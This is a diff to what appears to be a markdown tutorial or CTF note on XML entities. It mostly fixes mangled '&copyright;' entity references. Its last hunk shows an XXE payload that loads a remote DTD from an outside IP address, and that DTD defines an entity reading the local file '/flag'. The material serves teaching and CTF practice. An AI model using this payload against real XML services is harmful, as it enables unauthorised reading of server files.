@@ -27,7 +27,7 @@
 <!ENTITY copyright "Copyright runoob.com">
 ]>
 <note>
-  <to>Tove  ©right;</to>
+  <to>Tove  &copyright;</to>
 </note> 
 ```
 
@@ -41,7 +41,7 @@
 <!ELEMENT message (#PCDATA)>
 <!ENTITY copyright "135601360123502401401250">
 ]>
-<message>©right;</message>
+<message>&copyright;</message>
 ```
 
 ![](../.gitbook/assets/kCdb6Olfu4v44KElBD00BuxLY61l73GjwkxjQdRbjDA.png)
@@ -56,7 +56,7 @@
 <!ENTITY  % xxe SYSTEM "http://121.5.66.238:20001/123.dtd" >
 %xxe;
 ]>
-<message>©right;&evil;</message>
+<message>&copyright;&evil;</message>
 123.dtd
 <!ENTITY evil SYSTEM "file:///flag" >
 ```
